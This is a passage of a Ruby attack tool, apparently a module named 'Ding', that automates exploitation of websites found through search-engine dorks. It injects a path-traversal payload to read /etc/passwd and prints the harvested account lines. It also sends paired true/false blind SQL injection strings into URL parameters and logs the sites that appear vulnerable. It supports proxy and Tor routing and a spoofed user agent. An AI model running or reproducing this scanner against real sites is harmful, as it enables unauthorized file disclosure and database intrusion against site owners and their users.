						end

						tracker=0
						passwdz=[]
						vchk.each do |resp_line|
							resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
							if resp_line =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/
								passwdz << $1
								tracker=1
							end
						end
						if tracker.to_i == 0
							regexCheck(injlnk, vchk, key, value)
						elsif tracker.to_i == 1
							puts "[".light_green + "*".white + "] Link".light_green + ": #{injlnk.chomp}".white
							puts "[".light_green + "*".white + "] File Found".light_green + ": /etc/passwd".white
							puts "#{passwdz.join("\n")}".cyan
							puts
							vlinks = File.new("#{$results}/ding/lfi-confirmed.results", "a+") 
							vlinks.puts "#{@injlnk}"
							vlinks.close
						end

					else #############<=ELSE SINGLE PARAMETER LINKS=>##############
						injlnk = line.sub("#{value}", "../../../../../../../../../etc/passwd%00") #Set a injection link variable
						@injlnk = injlnk
						if $module_optional['ProxyIp'] == 'nil' #NEW TIMEOUT & Proxy Options just for Squirmy :)
							#RUN NORMAL REQUEST
							vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
						else
							if $module_optional['Username'] == 'nil'
								#RUN PROXY WITHOUT AUTH
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@non_set_private_options['Proxy']}"}).readlines
							else
								#RUN PROXY WITH AUTH
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}).readlines
							end
						end

						tracker=0
						passwdz=[]
						vchk.each do |resp_line|
							resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
							if resp_line =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/
								passwdz << $1
								tracker=1
							end
						end

						if tracker.to_i == 0
							regexCheck(injlnk, vchk, key, value)
						elsif tracker.to_i == 1
							puts "[".light_green + "*".white + "] Link".light_green + ": #{injlnk.chomp}".white
							puts "[".light_green + "*".white + "] File Found".light_green + ": /etc/passwd".white
							puts "#{passwdz.join("\n")}".cyan
							puts
							vlinks = File.new("#{$results}/ding/lfi-confirmed.results", "a+") 
							vlinks.puts "#{@injlnk}"
							vlinks.close
						end
					end
				end
			#random HTTP errors, i.e. skip link but note error
			rescue OpenURI::HTTPError => e
				if e.to_s == "404 Not Found"
					puts "\t=> #{e}".red
					next
				elsif e.to_s == "500 Internal Server Error"
					#something to scan page anyways for ASP stupid Winblows sites
					puts "\t=> #{e}".red
					puts "\tRunning additional checks".light_blue + ".....".white
					foores = e.io.readlines
					regexCheck(@injlnk, foores, @key, @value)
				else
					puts "\t=> #{e}".red
				end
			rescue Errno::EINVAL => e
				puts "\t=> #{e}".yellow
			rescue Net::HTTPBadResponse
				puts "\t=> Problem reading response due to TOR, sorry".red + "......".white
			rescue Errno::ECONNREFUSED
				puts "\t=> Problem communicating with site, connection refused".red + "!".white
			rescue Errno::EHOSTUNREACH
				puts "\t=> Problem communicating with site, host unreachable".red + "!".white
			rescue EOFError
				puts "\t=> Problem communicating with site".red + "....".white
			rescue SocketError
				puts "\t=> Problem connecting to site".red + "....".white
			rescue OpenSSL::SSL::SSLError
				puts "\t=> Issues with Remote Host's OpenSSL Server Certificate".red + "....".white
			rescue Errno::ENOENT
				puts "\t=> Jacked URL parsing due to no value with parameter, sorry".red + "....".white
				next
			rescue Errno::ECONNRESET
				puts "\t=> Problem connecting to site".red + "....".white
			rescue RuntimeError => e
				if e.to_s == 'Timeout::Error' # we took longer than read_timeout value said they could :p
					puts "\t=> Connection Timeout".red + "!".cyan
			#open-uri cant redirect properly from http to https due to a check it has built-in, so cant follow redirect :(
				else
					puts "\t=> Can't properly follow the redirect!".red
				end
			rescue Timeout::Error
				#timeout of sorts...skip
				puts "\t=> Connection Timeout!".red
			rescue Errno::ETIMEDOUT
				#timeout of sorts...skip
				puts "\t=> Connection Timeout".red + "!".white
			rescue TypeError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".white
				next
			rescue URI::InvalidURIError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".white
				next
			rescue NoMethodError => e
			# If bad link cause error cause its not a link dont freak out....Dont do anything....got something better?
				puts "[".light_red + "*".white + "] Testing Link".light_red + ": #{line.chomp}".white
				puts "\t=> No Testable Paramaters!".red
			end
		end
	end

	#Blind SQL Injection Test
	def blindTest(num) #1=Single Dork, 2=File Option
		puts "[".light_green + "*".white + "] Commencing ".light_green + "Blind ".white + "Injection Tests".light_green + "....".white
		File.open("#{$results}/ding/ding2.results", "r").each do |line|
			if line =~ /r.msn.com/ or line =~ /bingads.microsoft.com/
				next
			end
			begin
				param = URI.parse(line).query #See if we cause any errors to weed out no parameter links....
				#break paramaters into hash [ "key" => "value" ] formatting held in storage for easier manipulation
				params = Hash[URI.parse(line).query.split('&').map{ |q| q.split('=') }] 
				puts "[".light_red + "*".white + "] Testing Link".light_red + ": #{line.chomp}".white
				count=0
				tracker=0
				params.each do |key, value| #cycle through hash and print key and associated value
					@key = key
					@value = value
					if params.length > 1 #Multiple Parameter Links
						if count == 0
							puts "\t=> Multiple Paramters, testing all".light_blue + "....".cyan
							count += 1
						end
						injlnkTRUE = line.sub("#{value}", "#{value}%20and%205151%3D5151") #TRUE injection
						@injlnkTRUE = injlnkTRUE
						injlnkFALSE = line.sub("#{value}", "#{value}%20and%205151%3D5252") #FALSE injection
						@injlnkFALSE = injlnkFALSE

						if $module_optional['ProxyIp'] == 'nil'
							#RUN NORMAL REQUEST
							truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
							falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
						else
							if $module_optional['Username'] == 'nil'
								#RUN PROXY WITHOUT AUTH
								truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@non_set_private_options['Proxy']}"}).readlines
								falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@non_set_private_options['Proxy']}"}).readlines
							else
								#RUN PROXY WITH AUTH
								truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}).readlines
								falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}).readlines
							end
						end

						if truerez.length != falserez.length
							puts "\t=> Possible Blind SQL injection".light_green + "!".white
							vlinks = File.new("#{$results}/ding/sql-blind.results", "a+") 
							vlinks.puts "#{@injlnkTRUE}"
							vlinks.close
						end
					else #############<=ELSE SINGLE PARAMETER LINKS=>##############
						injlnkTRUE = line.sub("#{value}", "#{value}%20and%205151%3D5151") #TRUE injection
						@injlnkTRUE = injlnkTRUE
						injlnkFALSE = line.sub("#{value}", "#{value}%20and%205151%3D5252") #FALSE injection
						@injlnkFALSE = injlnkFALSE

						if $module_optional['ProxyIp'] == 'nil'
							#RUN NORMAL REQUEST
							truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
							falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
						else
							if $module_optional['Username'] == 'nil'
								#RUN PROXY WITHOUT AUTH
								truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@non_set_private_options['Proxy']}"}).readlines
								falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@non_set_private_options['Proxy']}"}).readlines
							else
								#RUN PROXY WITH AUTH
								truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}).readlines
								falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}).readlines
							end
						end

						if truerez.length != falserez.length
							puts "\t=> Possible Blind SQL injection".light_green + "!".white
							vlinks = File.new("#{$results}/ding/sql-blind.results", "a+") 
							vlinks.puts "#{@injlnkTRUE}"
							vlinks.close
						end
					end
				end
			#random HTTP errors, i.e. skip link but note error
			rescue OpenURI::HTTPError => e
				if e.to_s == "404 Not Found"
					puts "\t=> #{e}".red
					next
				elsif e.to_s == "500 Internal Server Error"
					#something to scan page anyways for ASP stupid Winblows sites
					puts "\t=> #{e}".red
				else
					puts "\t=> #{e}".red
				end
			rescue Net::HTTPBadResponse
				puts "\t=> Problem reading response due to TOR, sorry".red + "......".white
			rescue Errno::ECONNREFUSED
				puts "\t=> Problem communicating with site, connection refused".red + "!".white
			rescue Errno::EHOSTUNREACH
				puts "\t=> Problem communicating with site, host unreachable".red + "!".white
			rescue EOFError
				puts "\t=> Problem communicating with site".red + "....".white
			rescue SocketError
				puts "\t=> Problem connecting to site".red + "....".white
			rescue OpenSSL::SSL::SSLError
				puts "\t=> Issues with Remote Host's OpenSSL Server Certificate".red + "....".white
			rescue Errno::ENOENT
				puts "\t=> Jacked URL parsing due to no value with parameter, sorry".red + "....".white
				next
			rescue Errno::EINVAL => e
				puts "\t=> #{e}".yellow
			rescue Errno::ECONNRESET
				puts "\t=> Problem connecting to site".red + "....".white
			rescue RuntimeError => e
				if e.to_s == 'Timeout::Error' # we took longer than read_timeout value said they could :p
					puts "\t=> Connection Timeout".red + "!".cyan
			#open-uri cant redirect properly from http to https due to a check it has built-in, so cant follow redirect :(
				else
					puts "\t=> Can't properly follow the redirect!".red
				end
			rescue Timeout::Error
				#timeout of sorts...skip
				puts "\t=> Connection Timeout!".red
			rescue Errno::ETIMEDOUT
				#timeout of sorts...skip
				puts "\t=> Connection Timeout".red + "!".white
			rescue TypeError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".white
				next
			rescue URI::InvalidURIError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".white
				next
			rescue NoMethodError => e
			# If bad link cause error cause its not a link dont freak out....Dont do anything....got something better?
				puts "[".light_red + "*".white + "] Testing Link".light_red + ": ".cyan + "#{line.chomp}".white
				puts "\t=> No Testable Paramaters!".red
			end
		end
	end
end

Ding.new

